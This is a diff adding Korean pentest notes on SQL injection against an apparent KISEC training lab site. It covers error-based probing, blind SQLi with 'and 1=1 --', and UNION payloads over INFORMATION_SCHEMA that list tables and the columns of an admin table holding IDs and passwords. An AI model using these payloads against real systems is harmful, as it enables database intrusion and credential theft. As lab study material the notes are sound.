@@ -97,9 +97,108 @@ tags: [Pentest, TTPs]
 
 **즉, 접근 권한에 대한 인증 프로세스 및 올바른 접근 통제 로직이 구현되지 않아 다른 사용자의 민감한 정보나 인가되지 않은 페이지에 접근할 수 있는 것을 의미한다.**
 
+## SQL Injection
+### 에러 페이지 반환 점검
 
-## 프로세스 검증 누락
+첫번째 SQLi 점검 기법으로 **'**(싱글 쿼테이션)을 하나 추가하여 Query문을 비정상적으로 만드는 것이다. 
 
-## 불충분한 세션 만료
+<p align="center">
+<img src ="https://user-images.githubusercontent.com/78135526/184571353-47f09812-253b-46a6-a6e5-63e518d350f2.jpg" width = 420>
+</p>
 
-## 디렉토리 인덱싱
+* 해당 URL : http://10.200.43.12/kisec/dataRoom/kisec_lab.html?keyfield=t1.b_title&keyword='
+
+해당 검색란에 **'**(싱글 쿼테이션)을 넣으면 비정상적인 쿼리로 인해 DB 에러 페이지가 노출된다.
+
+<p align="center">
+<img src ="https://user-images.githubusercontent.com/78135526/184571599-0705d2e3-d229-4463-9925-9bc152a84556.jpg" width = 380>
+</p>
+
+데이터베이스의 주요 정보가 노출되지 않았지만, 이처럼 쿼리자체에 문제가 있다고 노출시키는 것만으로 타 공격자에 의해 무차별적 공격이 이루어질 수 있다.
+
+_위 증상이 발생하는 페이지_
+
+* **커뮤니티**
+   * **공지사항** : http://10.200.43.12/kisec/dataRoom/notice.html?keyfield=t1.b_title&keyword='
+   * **KISEC Album** : http://10.200.43.12/kisec/dataRoom/kisec_album.html?keyfield=t1.b_title&keyword='
+   * **f-NGS Lab** : http://10.200.43.12/kisec/dataRoom/kisec_lab.html?keyfield=t1.b_title&keyword=
+   * **수강 후기** : http://10.200.43.12/kisec/dataRoom/after.html?keyfield=t1.b_title&keyword=
+   * **공통 인덱스** : 각 게시물 URL **idx** parameter
+
+* **로그인**
+   * **모든 입력란** : http://10.200.43.12/kisec/member/join_m_step02.html
+
+### Blind SQLi
+
+쿼리문을 전송하고 이 쿼리의 참, 거짓 여부를 활용하여 데이터를 얻어내는 점검 방식을 말합니다.
+
+웹 페이지를 여는 URL의 **indx** 부분에
+`and 1=1 -- `를 추가하였을 때, 만약 응답 기반의 취약점이 존재한다면 and 이후 문장의 참 / 거짓 여부에 따라 정상 / 에러 페이지가 결정된다.
+
+* **참일 경우**
+
+<p align="center">
+<img src ="https://user-images.githubusercontent.com/78135526/184587199-88b3eb47-245a-4945-bbb2-f1d1dc35daf4.jpg" width = 420>
+</p>
+
+<p align="center">
+<img src ="https://user-images.githubusercontent.com/78135526/184587205-d1ff2014-be09-44fc-ba9a-548d84349b5c.jpg" width = 420>
+</p>
+
+* **거짓일 경우**
+
+<p align="center">
+<img src ="https://user-images.githubusercontent.com/78135526/184587485-e21ee6e5-56f9-4282-943f-228c3811f773.jpg" width = 420>
+</p>
+
+<p align="center">
+<img src ="https://user-images.githubusercontent.com/78135526/184587489-6bee916a-8262-4193-8e07-d7be4724a93c.jpg" width = 420>
+</p>
+
+
+### 모의 침투
+
+Union SQL Injection을 이용한 모의 침투를 실시한다.
+
+```
+http://10.200.43.12/kisec/dataRoom/notice_view.html?idx=36&keyfield=&keyword=
+http://10.200.43.12/kisec/dataRoom/kisec_lab_view.html?idx=26&keyfield=&keyword=
+http://10.200.43.12/kisec/dataRoom/after_view.html?idx=37&keyfield=&keyword=
+```
+
+홈 > 커뮤니티 : `KISEC ALBUM`을 제외한 3개의 URL **idx** parameter를 이용한다.
+
+* INFORMATION_SCHEMAS : 데이터베이스의 정보를 담고 있으며 모든 Table과 Column의 정보 역시 포함하고 있습니다.
+
+데이터베이스 종류 | 연결 연산자|
+:-----:|:-----:|
+TABLES | DB 내의 모든 테이블 정보
+COLUMNS | DB 내의 모든 칼럼 정보
+
+<p align="center">
+<img src ="https://user-images.githubusercontent.com/78135526/184582642-a751e470-2272-4e3a-863c-1e37ba9216f2.jpg" width = 420>
+</p>
+
+```SQL 
+' UNION SELECT 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, GROUP_CONCAT(TABLE_NAME SEPARATOR ' '), 17, 18 FROM INFORMATION_SCHEMA.TABLES -- 
+```
+(주석인 **--** 뒤에 공백 필요)
+
+현재 사용중인 데이터베이스의 모든 테이블 값이 출력되는 것을 알 수 있다.
+
+이 중에서 노출되면 위험하다고 예상되는 부분인 `USER_PRIVILEGES, add_info, admin_mem, hm_admin_tb`가 있다.
+
+<p align="center">
+<img src ="https://user-images.githubusercontent.com/78135526/184585396-1778885b-ce25-4759-9a33-610099b94879.jpg" width = 420>
+</p>
+
+```SQL
+' UNION SELECT 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, GROUP_CONCAT(COLUMNS_NAME SEPARATOR ' '), 17, 18 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = "HM_ADMIN_TB" -- 
+```
+
+* hm_admin_tb
+   * `idx admin_status admin_type admin_id admin_pass admin_name admin_phone admin_mobile admin_email admin_grade admin_hit admin_cmt reg_date last_date`
+
+이 테이블에는 관리자 계정에 관한 정보가 들어있는 것을 알 수 있다.
+
+**이와 같은 방식으로 원하는 테이블 명과 컬럼 명 및 세부 정보까지 확인할 수 있다.**
